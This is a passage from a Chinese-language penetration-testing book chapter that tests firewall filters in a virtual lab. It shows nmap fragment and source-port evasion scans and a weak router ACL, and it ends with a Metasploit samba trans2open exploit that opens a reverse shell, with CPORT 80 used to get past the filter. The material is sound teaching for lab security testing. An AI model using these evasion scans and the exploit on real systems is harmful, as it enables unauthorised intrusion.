一旦设置了路由和转发，就可以跨 iptable 测试规则了。在您的 Kali 机器中，使用 Netcat 或 Nmap 执行测试，以查看是否有到 OWASP 机器端口 80 的路由。或者，您也可以打开浏览器并以这种方式进行尝试。浏览器方法的示例显示在以下屏幕截图中：

![Identifying the firewall rules](graphics/477-1_07-48.jpg)

再一次设置好路由后，我们准备跨 iptables 规则集进行测试。正如我们之前所做的，我们将使用 Nmap 开始测试。在 Kali 中，输入`nmap 10.2.0.132`并查看结果。以下屏幕截图显示了一个结果示例：

![Identifying the firewall rules](graphics/477-1_07-49.jpg)

接下来，我们应该做与使用 Hping 工具之前相同的事情，但我们将为您省去麻烦。Iptables 不会像路由器那样响应；iptables 在过滤某些内容时根本不会响应。正如我们多次指出的，这就是测试的全部内容：您创建一个实验室环境，应用不同的设置和配置，并查看哪些工作正常，哪些不正常。

现在，我们准备看看 Smoothwall 防火墙。由于我们正在跨防火墙进行测试，因此基于我们的设计，我们有两个选项。我们可以通过路由器进行测试，然后通过防火墙。然而，在测试过程中，我们希望使事情尽可能简单。因此，我们将直接通过防火墙进行测试；下面的屏幕截图显示了我们的网络设计示例：

![Identifying the firewall rules](graphics/477-1_07_50.jpg)

再一次，我们必须确定我们的路线。我们现在的目标是 VMnet3 交换机，因此，我们必须路由到该网络。

### 注

我们不需要在这里打开 IP 转发，因为 Smoothwall 机器为我们处理它。

我们需要注意 metasploitable 机器的 IP 地址。当我们在本书前面设置机器时，我们在 VMnet3 交换机上设置了一个 DHCP 服务器；因此，机器应该在引导时获取一个地址。要确定 IP 地址，您需要登录机器并输入`msfadmin`和密码`msfadmin`。登录后，输入`ifconfig`并显示界面信息。下面的屏幕截图中显示了一个示例：

![Identifying the firewall rules](graphics/477-1_07-51.jpg)

### 注

如果地址与您创建的地址不同，则您可能需要修改它以匹配目标计算机上的地址。同样，我们之前已经讨论过这个问题，所以这里不再讨论。为了防止出现这种情况，您可以将地址配置为静态地址，并在启动时分配。

提醒：您必须在 metasploitable 机器中添加路由；为此，您需要使用命令`sudo`。添加管线的命令如下所示：

```
sudo add -net 10.2.0.0 gw 10.3.0.10 netmask 255.255.255.0 dev eth0

```

一旦设置了路由，就可以使用前面讨论的任何方法对其进行测试。下一个屏幕截图显示了使用 telnet 进行测试的示例：

![Identifying the firewall rules](graphics/477-1_07-52.jpg)

我们现在已准备好以目标为目的地进行防火墙测试。正如我们之前所做的，最简单的方法是使用我们的工具 Nmap。此外，我们希望运行 Wireshark 并进行比较，以查看是否与直接扫描机器时看到的有任何差异。在 Kali 机器中，输入`nmap 10.3.0.128`扫描目标。请记住，如果您有不同的 IP 地址，则需要输入该地址。以下屏幕截图显示了 Nmap 扫描的示例：

![Identifying the firewall rules](graphics/477-1_07-53.jpg)

正如前面的截图所示，在 Wireshark 和 Smoothwall 机器上进行的测试之间没有太大的差异。您可能还记得，当我们在数据包级别检查结果时，我们发现 Smoothwall 机器有时会响应 ICMP 消息；这是一种目标不可访问的消息类型，代码是端口不可访问的。以下屏幕截图显示了来自扫描的 ICMP 消息示例：

![Identifying the firewall rules](graphics/477-1_07-54.jpg)

显示来自扫描的 ICMP 消息示例的屏幕（剪切的文本不重要）

正如前面的屏幕截图所示，我们确实有 ICMP 消息，因此这是我们可以记录的。在发现阶段，如果我们找到一个使用 Smoothwall 防火墙的客户机，我们将获得如何对其进行攻击的数据。欢迎您继续，测试数据，看看您能发现什么；和往常一样，记住记录所有内容。出于我们的目的，我们已经实现了本节的目标，并且我们已经准备好进入下一节。

# 穿透过滤器的技巧

根据我们在本章中发现的情况，您可以看到，当我们遇到一台设备时，我们成功地瞄准它，甚至通过它瞄准它，这取决于管理员为使设备尽可能具有限制性所做的工作量。

尽管如此，有时管理员会犯错误，这也是我们作为专业安全测试人员工作的一部分。我们必须找出这些存在的错误并记录下来，以便客户能够修复它们。

我们继续看到的一件事是过滤规则很弱，这已经存在很长时间了。尽管有新产品，我们在测试时仍然可以发现弱过滤规则；因此，在本章结束之前的最后一节将讨论如何检测这些。

我们将创建并测试的第一个弱过滤器，以便记录结果，将是无状态过滤器中经常遇到的过滤器，即路由器。我们将使用 Dynamips 虚拟机，目标是 OWASP 机器。在路由器计算机中，打开一个终端窗口并输入以下命令以使 Dynamips 计算机运行：

```
dynamips –H 7200 &
dynagen config.net

```

如您所见，这次我们在后台运行命令，以避免打开另一个终端窗口；如果你想使用单独的窗口，这取决于你。我们需要创建一个弱规则，然后我们将执行一些技术，看看我们可以使用哪种技术从过滤器后面的目标获取更多信息。路由器启动后，输入以下命令：

```
console R1
en
conf t
ip access-list extended External
permit tcp any eq 80 any

```

按*Ctrl*+*Z*，然后输入以下命令：

```
Show ip access-lists

```

以下屏幕截图显示了配置示例：

![Tricks to penetrate filters](graphics/477-1_07-55.jpg)

我们现在有了一个弱过滤规则，这在测试时非常常见。一些管理员会为返回流量添加规则，并允许来自某个端口的所有流量通过。我们在这里使用端口 80，但它最常见于端口 20、53 和 67。微软的防火墙有弱点，众所周知，它允许所有以端口 88（Kerberos）作为源端口的流量通过过滤器。

我们在路由器上添加了一个新规则，如果我们做一些研究，我们会发现有一些技术可以穿透防火墙，所以我们现在将尝试其中一种。我们要尝试的第一个方法是分段扫描，因此在 Kali 中输入`nmap –f 10.2.0.132`以将分段扫描指向目标。以下屏幕截图显示了一个结果示例：

![Tricks to penetrate filters](graphics/477-1_07-56.jpg)

嗯，这次扫描甚至没有检测到一个打开的端口，所以我们可以记录它并继续。如前所述，有许多扫描可以尝试，您的成功与否取决于您遇到的管理员。我们将再看一个，鼓励您自己探索其他方法。您可以在[找到许多技术的列表 http://pentestlab.wordpress.com/2012/04/02/nmap-techniques-for-avoiding-firewalls/](http://pentestlab.wordpress.com/2012/04/02/nmap-techniques-for-avoiding-firewalls/) 。

下一个我们将研究的是通常为您提供最成功的技术，这就是我们前面提到的技术。过滤器中的一个常见缺点是允许从某个端口返回流量的规则。幸运的是，使用 Nmap，我们有一个源端口扫描选项，因此我们可以始终从特定端口引导流量。我们希望进行扫描并使用此选项。在您的 Kali 终端窗口中，输入`nmap –g 80 10.2.0.132`。`g`选项将引导流量来自输入的端口，在本例中为端口 80。以下屏幕截图显示了一个示例：

![Tricks to penetrate filters](graphics/477-1_07-57.jpg)

成功我们现在有了关于过滤器后面目标的更多细节；因此，只要我们从源端口 80 生成流量，我们现在就可以针对它执行正常的测试方法。

因为我们可以到达过滤器后面机器上所有打开的端口，让我们进一步研究一下。我们可以尝试使用漏洞扫描器，但在大多数情况下，漏洞扫描器并不是为通过过滤器而设计的，因此我们必须手动从目标上运行的服务中提取信息，并查看是否可以找到可能是我们攻击的向量的内容，假设我们可以从端口 80 发送攻击。这是我们必须进一步研究的问题。

首先，我们想看看这些端口上运行的是什么，所以我们可以使用 Nmap 从这些端口获取横幅。

### 注

您还可以使用 Netcat 通过过滤器并通过选项`-p`从特定源端口到达目标。这是留给读者的练习。

我们可以使用多种不同的扫描技术从目标获取服务信息；我们将使用一个旧的，仍然是有效的，比一些新的更快。在您的 Kali 机器终端窗口中，输入`nmap -g 80 –sV 10.2.0.132`以获取服务的标题。以下屏幕截图显示了一个示例：

![Tricks to penetrate filters](graphics/477-1_07-58.jpg)

在前面的屏幕截图中，有趣的是扫描显示通常在 Windows 平台上找到的端口 139 和 145 是打开的。

从这里开始，过程就是寻找易受攻击的服务版本，甚至是操作系统，然后尝试利用漏洞。为此，我们将使用另一台机器进行测试，该机器是[中的 Kioptrix 发行版 http://www.kioptrix.com/blog/](http://www.kioptrix.com/blog/) 。我们可以从该网站下载许多发行版。我们将使用**一级**版本。过程是在设置中打开虚拟机并将其连接到 VMnet2 网络；这样，我们就有了一台可以测试的机器。

以下屏幕截图显示了虚拟机设置的示例：

![Tricks to penetrate filters](graphics/477-1_07-59.jpg)

一旦机器启动，我们需要确定 DHCP 服务器分配的 IP 地址。我们可以通过扫描 VMnet2 子网来实现这一点。

在 Kali 机器的终端窗口中输入`nmap –g 20 –sP 10.2.0.100-200`，对 VMnet2 网络进行 ping 扫描。我们有权知道 DHCP 服务器的起始和结束 IP 范围，因此我们将在这里使用它来加速扫描。扫描示例如以下屏幕截图所示：

![Tricks to penetrate filters](graphics/477-1_07-60.jpg)

我们看到我们的结果中有三个目标，我们知道 132 机器是 OWASP，135 机器是我们的 Kali 机器；因此，我们感兴趣的目标是 140 机器。这同样是可能的，因为路由器上的弱过滤器配置。一旦我们找到了解决方法，我们将继续使用它。我们需要知道目标上正在运行哪些服务，因此输入`nmap –g 80 –sV 10.2.0.140`以显示目标上的服务信息。我们知道此目标计算机不是 Windows 计算机，但我们在目标计算机上打开了类似 Windows 的端口。

既然如此，我们可以得出结论，samba 正在机器上运行。存在多个 samba 漏洞；我们可以对它们进行研究，看看我们是否成功。

我们介绍了许多查找漏洞的技术，我们将通过查看一些可用的 samba 漏洞来为您省去一些麻烦。如果您输入`msfconsole`来启动 metasploit 工具，则需要一些时间才能启动程序，一旦启动，我们希望使用出色的搜索功能；输入`search samba`。以下屏幕截图显示了部分结果的示例：

![Tricks to penetrate filters](graphics/477-1_07-61.jpg)

正如前面的截图所示，我们有许多可用的漏洞利用；我们想选择那些评级为“好”或“更好”的，因为这将提供最大的成功机会。尽管如此，没有成功的保证，但这是剥削的现实。那么，你选哪一个？好的，我们已经讨论了研究的概念，这就是你如何找到最适合你的方法。我们会为你节省时间；在 metasploit 窗口中输入以下内容：

```
use exploit/linux/samba/trans2open
set RHOST 10.2.0.140
set payload linux/x86/shell/reverse_tcp
set LHOST 10.2.0.135
set LPORT 123
exploit

```

我们使用 Kali 机器作为反向外壳的连接，我们使用端口 123 让它来连接我们。当它离开时，通常不进行检查，因此，通常工作得很好。此攻击将失败，因为没有来自流量的源端口。以下屏幕截图显示了一个示例：

![Tricks to penetrate filters](graphics/477-1_07-62.jpg)

正如前面的屏幕截图所示，利用漏洞无法到达目标。好的，我们知道我们有一种方法到达目标，这涉及到将流量设置为来自特定的源端口，那么我们该怎么做？幸运的是，metasploit 的创建者为我们提供了一种实现这一点的方法，但它并不广为人知，事实上也没有很好的文档记录，因此它可能随时消失；因此，保留旧的虚拟机总是好的，以防我们喜欢的东西消失。我们所指的期权是`CPORT`期权；因此，在 metasploit 工具中输入以下命令，将所有通信量从源端口 80 发送到目标：

```
set CPORT 80

```

然后，输入利用漏洞再次尝试。以下屏幕截图显示了一个示例：

![Tricks to penetrate filters](graphics/477-1_07-63.jpg)

同样，如果你的攻击失败，这种情况并不罕见，一种选择是设置网络平坦，然后尝试攻击。不幸的是，这里没有任何保证。最重要的是你知道什么时候发现过滤器，知道尝试穿透过滤器的方法。

下一步要做的是对 iptables 机器尝试相同的过程和方法。结果非常相似；因此，我们将把它作为家庭作业留给那些想练习它的人。像往常一样，记录你的所有发现，并继续实验和学习。

# 总结

在本章中，我们建立了一个系统的分步过程，以确定我们对各种设备进行评估的时间。我们从路由器设备开始这一章，然后转到交换机。在路由器和交换机之后，我们继续讨论遇到防火墙时该怎么做。

一旦我们学会了如何处理许多不同的设备，我们就转到了识别现有过滤规则的方法。我们发现，当对某些设备进行扫描时，它们的响应将不符合 RFC 中规定的标准；此外，我们能够发现，当设备上有规则时，一个端口通常会有一个响应，为我们提供有关如何对该设备进行操作的其他详细信息。

最后，我们在本章结束时讨论了穿透过滤器的技巧，并研究了如何使用碎片扫描；然而，这并没有带来多少成功。然后，我们研究了强大的源端口扫描技术，事实上，这非常成功地允许我们列举关于目标的附加信息；此外，我们还展示了如果发现源端口的弱点，我们可以选择从特定的源端口发起攻击。

本章到此结束。现在，当您遇到设备时，您有了一个完善的流程和方法。正如我们在本章中所讨论的，在很多时候，您将很难找到通过设备的方法，但这是专业安全测试的一部分，也是您学习最多的时候。事实上，在大多数情况下，你越努力，你学到的东西就越多。永远记住记录你观察到的所有事情。这是一个谨慎而专业的测试人员在构建和测试虚拟实验室时会采用的习惯。在下一章中，我们将了解如何构建 IDS/IPS 范围。